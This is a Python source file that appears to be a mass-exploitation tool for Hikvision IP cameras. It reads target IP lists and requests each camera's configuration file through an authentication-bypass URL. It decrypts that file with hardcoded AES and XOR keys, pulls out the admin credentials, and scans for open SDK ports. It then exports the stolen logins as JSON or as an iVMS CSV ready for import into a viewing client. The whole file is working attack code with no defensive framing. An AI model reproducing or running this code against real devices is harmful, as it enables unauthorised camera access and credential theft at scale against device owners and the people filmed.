#!/usr/bin/env python3

import json
import argparse
import re
import os
import sys
import socket
import threading
import queue
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
 
from Crypto.Cipher import AES
import requests
from requests.exceptions import RequestException, ConnectionError, Timeout
from requests.auth import HTTPBasicAuth

 
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

 
HEX_DATA = "0000002063000000119706d5001110c26800a8c025801157cc28aa16edda0000"
MATCH_PREFIX = "000000c4"
DEFAULT_SDK_PORT = 8000
SDK_PORT_SCAN_RANGE = range(8000, 8101)
SCAN_TIMEOUT = 1
REQUEST_TIMEOUT = 3
DEFAULT_HTTP_PORT = 80
DEFAULT_RTSP_PORT = 554


class HikvisionCracker:
    """Core class for Hikvision device cracking"""
    def __init__(self):
        self.url_suffix = "/System/configurationFile?auth=YWRtaW46MTEK"
        self.default_user = "admin"
        self.aes_key = '279977f62f6cfd2d91cd75b889ce0c9a'
        self.xor_key = bytearray([0x73, 0x8B, 0x55, 0x44])
        
        self.csv_header = (
            "Name,"
            "Adding Mode (0: IP/Domain; 1: HiDDNS; 2: ISUP),"
            "Address (Adding Mode 0: IP Address/Domain Name; Adding Mode 1: Server Address; Adding Mode 2: Invalid),"
            "Port,"
            "Device Information (Adding Mode 0: Invalid; Adding Mode 1: Domain Name; Adding Mode 2: Account),"
            "User Name,"
            "Password (Adding Mode 0/1: Password; Adding Mode 2: ISUP Key),"
            "Add Offline Device (0: No; 1: Yes),"
            "Export to Group (0: No; 1: Yes),"
            "Channel Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Alarm Input Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Transmission Encryption (TLS) (0: No; 1: Yes)"
        )
        
        self.result_lock = threading.Lock()
        self.print_lock = threading.Lock()
        self.cracked_devices = []
        self.open_sdk_ports = {}
        self.final_results = []

    def validate_ip(self, ip: str) -> bool:
        """Validate if IP format is valid"""
        pattern = re.compile(r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
        return bool(pattern.match(ip))

    def scan_single_ip_sdk_port(self, ip: str, port: int) -> int:
        """Scan specified SDK port for single IP"""
        if ip in self.open_sdk_ports:
            return None
        
        try:
            payload = bytes.fromhex(HEX_DATA)
        except ValueError as e:
            with self.print_lock:
                print(f"[!] {ip}:{port} Hex data conversion failed: {str(e)[:30]}")
            return None

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(SCAN_TIMEOUT)
                s.connect((ip, port))
                s.sendall(payload)
                resp = s.recv(4096)
                
                if resp and resp.hex().startswith(MATCH_PREFIX):
                    with self.result_lock:
                        self.open_sdk_ports[ip] = port
                    with self.print_lock:
                        print(f"[SDK Crack Success] {ip}:{port}")
                    return port
        except (socket.timeout, ConnectionRefusedError, OSError, ConnectionError):
            pass
        except Exception as e:
            with self.print_lock:
                print(f"[!] {ip}:{port} Scan exception: {str(e)[:30]}")
        return None

    def batch_brute_sdk_ports(self, ip_list: list, max_workers: int) -> None:
        """Batch brute-force SDK ports for cracked IPs"""
        with self.print_lock:
            print(f"[*] Start scanning SDK ports (Range: {SDK_PORT_SCAN_RANGE.start}-{SDK_PORT_SCAN_RANGE.stop-1})...")
 
        for ip in ip_list:
            if not self.validate_ip(ip):
                with self.print_lock:
                    print(f"[!] Invalid IP format: {ip}, skipped")
                continue
            
            ip_has_open_port = False  
            ports_to_scan = list(SDK_PORT_SCAN_RANGE)
            ports_to_scan.insert(0, DEFAULT_SDK_PORT)
            ports_to_scan = sorted(list(set(ports_to_scan)))
            
            thread_num = min(max_workers, len(ports_to_scan))
            with ThreadPoolExecutor(max_workers=thread_num) as executor:
                future_map = {}
                for port in ports_to_scan:
                    if ip in self.open_sdk_ports:
                        break
                    future = executor.submit(self.scan_single_ip_sdk_port, ip, port)
                    future_map[future] = port
                
                for future in as_completed(future_map):
                    port = future_map[future]
                    try:
                        result = future.result()
                        if result is not None:
                            ip_has_open_port = True
                            for remaining_future in future_map:
                                if not remaining_future.done():
                                    remaining_future.cancel()
                            break
                    except CancelledError:
                        pass
                    except Exception as e:
                        with self.print_lock:
                            print(f"[!] {ip}:{port} Scan exception: {str(e)[:30]}")
            
            if not ip_has_open_port:
                with self.print_lock:
                    print(f"[!] {ip} No open SDK ports found (Range 8000-8099)")

    def add_to_16(self, s: bytes) -> bytes:
        """AES decryption padding: make up to 16 bytes"""
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(self, ciphertext: bytes) -> bytes:
        """AES-ECB decryption"""
        try:
            key = bytes.fromhex(self.aes_key)
            ciphertext = self.add_to_16(ciphertext)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[AES.block_size:])
            return plaintext.rstrip(b"\0")
        except Exception as e:
            with self.print_lock:
                print(f"[!] AES decryption failed: {str(e)[:30]}")
            return b""

    def xore(self, data: bytes) -> bytes:
        """XOR decryption"""
        try:
            return bytes(a ^ b for a, b in zip(data, cycle(self.xor_key)))
        except Exception as e:
            with self.print_lock:
                print(f"[!] XOR decryption failed: {str(e)[:30]}")
            return b""

    def extract_strings(self, data: bytes) -> list:
        """Extract printable strings from binary data"""
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortest_len = 2
        reg_exp = f'[{chars}]{{{shortest_len},}}'
        pattern = re.compile(reg_exp)
        return pattern.findall(data.decode('ISO-8859-1', errors='ignore'))

    def request_config_file(self, ip: str, port: int = DEFAULT_HTTP_PORT) -> requests.Response:
        """Request device configuration file"""
        proto = "https" if port == 443 else "http"
        full_url = f"{proto}://{ip}:{port}{self.url_suffix}"
        try:
            response = requests.get(
                full_url, 
                timeout=REQUEST_TIMEOUT, 
                verify=False, 
                allow_redirects=False
            )  
            return response
        except Timeout:
            with self.print_lock:
                print(f"[!] {ip}:{port} Request timeout (> {REQUEST_TIMEOUT} seconds)")
        except ConnectionError:
            with self.print_lock:
                print(f"[!] {ip}:{port} Connection failed")
        except RequestException as e:
            with self.print_lock:
                print(f"[!] {ip}:{port} Request failed: {str(e)[:50]}")
        return None

    def find_last_list_index(self, lst: list, target: str) -> int:
        """Find the last occurrence index of target string in list"""
        try:
            return len(lst) - 1 - lst[::-1].index(target)
        except ValueError:
            return -1

    def clean_csv_field(self, field) -> str:
        """Clean CSV field to avoid format errors"""
        if not isinstance(field, str):
            field = str(field)
        field = field.replace(',', '&#44;')
        field = field.replace('\n', '').replace('\r', '')
        field = field.replace('\t', ' ')
        return field.strip()

    def crack_password(self, ip: str, http_port: int = DEFAULT_HTTP_PORT) -> dict:
        """Crack administrator password for single device"""
        response = self.request_config_file(ip, http_port)
        if response is None:
            return None
        
        if response.status_code == 200:
            try:
                binary_data = response.content
                decrypt_data = self.decrypt(binary_data)
                xor_data = self.xore(decrypt_data)
                
                data_list = self.extract_strings(xor_data)
                admin_index = self.find_last_list_index(data_list, 'admin')
                
                if admin_index != -1 and admin_index + 1 < len(data_list):
                    username = data_list[admin_index]
                    password = data_list[admin_index+1].strip() or "default123456"
                    
                    with self.print_lock:
                        print(f"[+] Crack success {ip}:{http_port} => {username}:{password}")
                    
                    return {
                        "ip": ip,
                        "http_port": http_port,
                        "username": username,
                        "password": password
                    }
                else:
                    with self.print_lock:
                        print(f"[!] {ip}:{http_port} Admin password not found")
            except Exception as e:
                with self.print_lock:
                    print(f"[!] {ip}:{http_port} Cracking exception: {str(e)[:50]}")
        else:
            with self.print_lock:
                print(f"[!] {ip}:{http_port} Status code {response.status_code}, skipped")
        return None

    def read_ips_from_file(self, file_path: str) -> list:
        """Read IP list from file (supports ip or ip:port format)"""
        if not os.path.exists(file_path):
            with self.print_lock:
                print(f"[!] Target file does not exist: {file_path}")
            return []
        
        if not os.access(file_path, os.R_OK):
            with self.print_lock:
                print(f"[!] No read permission: {file_path}")
            return []
        
        ip_list = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if ':' in line:
                        ip, port_str = line.split(':', 1)
                        ip = ip.strip()
                        port_str = port_str.strip()
                        
                        if not self.validate_ip(ip):
                            with self.print_lock:
                                print(f"[!] Line {line_num}: Invalid IP format {ip}, skipped")
                            continue
                        
                        if port_str.isdigit():
                            port = int(port_str)
                            if 1 <= port <= 65535:
                                ip_list.append({"ip": ip, "port": port})
                            else:
                                with self.print_lock:
                                    print(f"[!] Line {line_num}: Port {port_str} out of range, using default 80 for {ip}")
                                    ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                        else:
                            with self.print_lock:
                                print(f"[!] Line {line_num}: Port {port_str} is not a number, using default 80 for {ip}")
                                ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                    else:
                        ip = line.strip()
                        if self.validate_ip(ip):
                            ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
            
            unique_ips = {}
            for item in ip_list:
                if item["ip"] not in unique_ips:
                    unique_ips[item["ip"]] = item
            ip_list = list(unique_ips.values())
            
            with self.print_lock:
                print(f"[*] Successfully read {len(ip_list)} valid targets")
            return ip_list
        except Exception as e:
            with self.print_lock:
                print(f"[!] Failed to read file: {str(e)[:50]}")
        return []

    def parse_manual_ips(self, ip_str_list: list) -> list:
        """Parse manually input IP list (supports ip or ip:port format)"""
        ip_list = []
        for ip_str in ip_str_list:
            ip_str = ip_str.strip()
            if not ip_str:
                continue
            
            if ':' in ip_str:
                ip, port_str = ip_str.split(':', 1)
                ip = ip.strip()
                port_str = port_str.strip()
                
                if not self.validate_ip(ip):
                    with self.print_lock:
                        print(f"[!] Invalid IP format: {ip}, skipped")
                    continue
                
                if port_str.isdigit():
                    port = int(port_str)
                    if 1 <= port <= 65535:
                        ip_list.append({"ip": ip, "port": port})
                    else:
                        with self.print_lock:
                            print(f"[!] Port {port_str} out of range, using default 80 for {ip}")
                            ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                else:
                    with self.print_lock:
                        print(f"[!] Port {port_str} is not a number, using default 80 for {ip}")
                        ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
            else:
                ip = ip_str.strip()
                if self.validate_ip(ip):
                    ip_list.append({"ip": ip, "port": DEFAULT_HTTP_PORT})
                else:
                    with self.print_lock:
                        print(f"[!] Invalid IP format: {ip}, skipped")
        
        unique_ips = {}
        for item in ip_list:
            if item["ip"] not in unique_ips:
                unique_ips[item["ip"]] = item
        ip_list = list(unique_ips.values())
        
        with self.print_lock:
            print(f"[*] Successfully parsed {len(ip_list)} valid targets from manual input")
        return ip_list

    def crack_worker(self, task_queue: queue.Queue):
        """Cracking task worker thread"""
        while True:
            try:
                target = task_queue.get(timeout=1)
            except queue.Empty:
                return

            try:
                if isinstance(target, str):
                    t = target.strip()
                    if ':' in t:
                        ip, port = t.split(':', 1)
                        target = {"ip": ip.strip(), "port": int(port) if port.strip().isdigit() else DEFAULT_HTTP_PORT}
                    else:
                        target = {"ip": t, "port": DEFAULT_HTTP_PORT}

                if not isinstance(target, dict) or "ip" not in target:
                    raise TypeError(f"Invalid task format: {type(target)} -> {target}")

                ip = target.get("ip")
                http_port = int(target.get("port", DEFAULT_HTTP_PORT))

                result = self.crack_password(ip, http_port)
                if result and isinstance(result, dict):
                    with self.result_lock:
                        if not any(dev.get("ip") == ip for dev in self.cracked_devices):
                            self.cracked_devices.append(result)

            except Exception as e:
                with self.print_lock:
                    print(f"[!] Worker thread exception: {str(e)[:200]}")
            finally:
                try:
                    task_queue.task_done()
                except Exception:
                    pass

    def assemble_final_results(self):
        """Assemble final export results"""
        self.final_results.clear()
        
        for device in self.cracked_devices:
            ip = device["ip"]
            if ip not in self.open_sdk_ports:
                continue
            
            http_port = device["http_port"]
            username = device["username"]
            password = device["password"]
            sdk_port = self.open_sdk_ports[ip]
            
            csv_data = {
                "name": f"Cam_{ip.replace('.','_')}_{sdk_port}",
                "adding_mode": 0,
                "address": ip,
                "port": sdk_port,
                "device_info": "",
                "user_name": username,
                "password": password,
                "add_offline_device": 0,
                "export_to_group": 0,
                "channel_number": "",
                "alarm_input_number": "",
                "tls_encryption": 0
            }
            
            json_data = {
                "IP": ip,
                "HTTP_PORT": http_port,
                "SDK_PORT": sdk_port,
                "RTSP_PORT": DEFAULT_RTSP_PORT,
                "USERNAME": username,
                "PASSWORD": password
            }
            
            for key in csv_data:
                csv_data[key] = self.clean_csv_field(csv_data[key])
            
            self.final_results.append({
                "csv_data": csv_data,
                "json_data": json_data
            })

    def save_to_ivms_csv(self, csv_path: str) -> bool:
        """Export to IVMS format CSV file"""
        dir_path = os.path.dirname(csv_path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)
            with self.print_lock:
                print(f"[*] Created directory: {dir_path}")
        
        header_fields = self.csv_header.split(',')
        expected_fields_count = len(header_fields)
        
        csv_rows = [self.csv_header + "\r\n"]
        valid_rows = 0
        
        for idx, device in enumerate(self.final_results):
            if not device or "csv_data" not in device:
                continue
            
            csv_data = device["csv_data"]
            row = (
                f"{csv_data['name']},"
                f"{csv_data['adding_mode']},"
                f"{csv_data['address']},"
                f"{csv_data['port']},"
                f"{csv_data['device_info']},"
                f"{csv_data['user_name']},"
                f"{csv_data['password']},"
                f"{csv_data['add_offline_device']},"
                f"{csv_data['export_to_group']},"
                f"{csv_data['channel_number']},"
                f"{csv_data['alarm_input_number']},"
                f"{csv_data['tls_encryption']}\r\n"
            )
            
            row_fields_count = len(row.strip().split(','))
            if row_fields_count != expected_fields_count:
                with self.print_lock:
                    print(f"[!] Skip invalid row {idx}: {csv_data['address']} (fields count {row_fields_count} != {expected_fields_count})")
                continue
            
            csv_rows.append(row)
            valid_rows += 1
        
        try:
            with open(csv_path, 'w', encoding='utf-8', newline='') as f:
                f.writelines(csv_rows)
            
            if os.path.exists(csv_path):
                file_size = os.path.getsize(csv_path)
                with self.print_lock:
                    print(f"[*] Successfully exported {valid_rows} valid devices to CSV: {csv_path} (Size: {file_size} bytes)")
            return True
        except Exception as e:
            with self.print_lock:
                print(f"[!] Failed to export CSV: {str(e)}")
            return False

    def save_to_json(self, json_path: str) -> bool:
        """Export to JSON format file"""
        dir_path = os.path.dirname(json_path)
        if dir_path and not os.path.exists(dir_path):
            try:
                os.makedirs(dir_path, exist_ok=True)
                with self.print_lock:
                    print(f"[*] Directory created successfully: {dir_path}")
            except Exception as e:
                with self.print_lock:
                    print(f"[!] Failed to create directory: {str(e)[:30]}")
                return False
        
        json_output = []
        for device in self.final_results:
            if device and "json_data" in device:
                json_output.append(device["json_data"])
        
        try:
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(json_output, f, ensure_ascii=False, indent=4)
            
            if os.path.exists(json_path):
                file_size = os.path.getsize(json_path)
                with self.print_lock:
                    print(f"[*] JSON exported successfully: {json_path} (Size: {file_size} bytes, Number of devices: {len(json_output)})")
            return True
        except PermissionError:
            with self.print_lock:
                print(f"[!] No write permission: {json_path}")
            return False
        except Exception as e:
            with self.print_lock:
                print(f"[!] Failed to export JSON: {str(e)[:50]}")
            return False


class Exploit:
    def run(
        self,
        ips,
        threads=10,
        output_type="json",
        output_path="./result.json"
    ):
        cracker = HikvisionCracker()
        ip_list = []
        if isinstance(ips, str) and os.path.isfile(ips):
            ip_list = cracker.read_ips_from_file(ips)
        elif isinstance(ips, str):
            t = ips.strip()
            if t:
                if ':' in t:
                    ip, port = t.split(':', 1)
                    ip_list = [{"ip": ip.strip(), "port": int(port) if port.strip().isdigit() else DEFAULT_HTTP_PORT}]
                else:
                    ip_list = [{"ip": t, "port": DEFAULT_HTTP_PORT}]
        elif isinstance(ips, list):
            if ips and isinstance(ips[0], str):
                ip_list = cracker.parse_manual_ips(ips)
            else:
                for it in ips:
                    if isinstance(it, dict) and "ip" in it:
                        ip_list.append({"ip": it["ip"], "port": int(it.get("port", DEFAULT_HTTP_PORT))})
                    elif isinstance(it, str):
                        if ':' in it:
                            ip, port = it.split(':', 1)
                            ip_list.append({"ip": ip.strip(), "port": int(port) if port.strip().isdigit() else DEFAULT_HTTP_PORT})
                        else:
                            ip_list.append({"ip": it.strip(), "port": DEFAULT_HTTP_PORT})
        else:
            print("[!] Invalid target type")
            return

        if not ip_list:
            print("[!] No valid targets")
            return

        print(f"[*] Start cracking ({len(ip_list)} targets, threads={threads})")

        task_queue = queue.Queue()
        for item in ip_list:
            task_queue.put(item)

        worker_count = min(int(threads), max(1, task_queue.qsize()))
        workers = []
        for _ in range(worker_count):
            t = threading.Thread(
                target=cracker.crack_worker,
                args=(task_queue,),
                daemon=True
            )
            t.start()
            workers.append(t)

        task_queue.join()

        if not cracker.cracked_devices:
            print("[!] No devices cracked successfully")
            return

        cracked_ip_list = [d["ip"] for d in cracker.cracked_devices if isinstance(d, dict) and "ip" in d]
        cracker.batch_brute_sdk_ports(cracked_ip_list, threads)

        cracker.assemble_final_results()

        if not cracker.final_results:
            print("[!] No final results to export")
            return

        if output_type == "csv":
            cracker.save_to_ivms_csv(output_path)
        else:
            cracker.save_to_json(output_path)

        print(f"[*] Done! Exported {len(cracker.final_results)} devices in total")